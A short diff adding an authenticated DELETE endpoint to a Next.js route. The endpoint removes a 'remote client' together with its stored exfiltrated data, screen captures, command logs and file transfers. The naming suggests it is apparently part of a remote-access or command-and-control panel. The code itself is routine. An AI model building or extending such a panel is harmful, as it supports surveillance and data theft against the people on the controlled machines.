@@ -84,3 +84,31 @@ export async function GET() {
     return NextResponse.json({ error: "Internal error" }, { status: 500 })
   }
 }
+
+export async function DELETE(req: Request) {
+  try {
+    const session = await getServerSession(authOptions)
+    if (!session?.user) {
+      return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
+    }
+
+    const { id } = await req.json()
+    if (!id) return NextResponse.json({ error: "id required" }, { status: 400 })
+
+    const client = await prisma.remoteClient.findUnique({ where: { id } })
+    if (!client) return NextResponse.json({ error: "Not found" }, { status: 404 })
+
+    // Delete related data first
+    await prisma.exfiltratedData.deleteMany({ where: { clientId: id } })
+    await prisma.screenCapture.deleteMany({ where: { clientId: id } })
+    await prisma.commandLog.deleteMany({ where: { clientId: id } })
+    await prisma.fileTransfer.deleteMany({ where: { clientId: id } })
+    await prisma.clientSession.deleteMany({ where: { clientId: id } })
+    await prisma.remoteClient.delete({ where: { id } })
+
+    return NextResponse.json({ success: true })
+  } catch (error) {
+    console.error("[CLIENTS_DELETE]", error)
+    return NextResponse.json({ error: "Internal error" }, { status: 500 })
+  }
+}
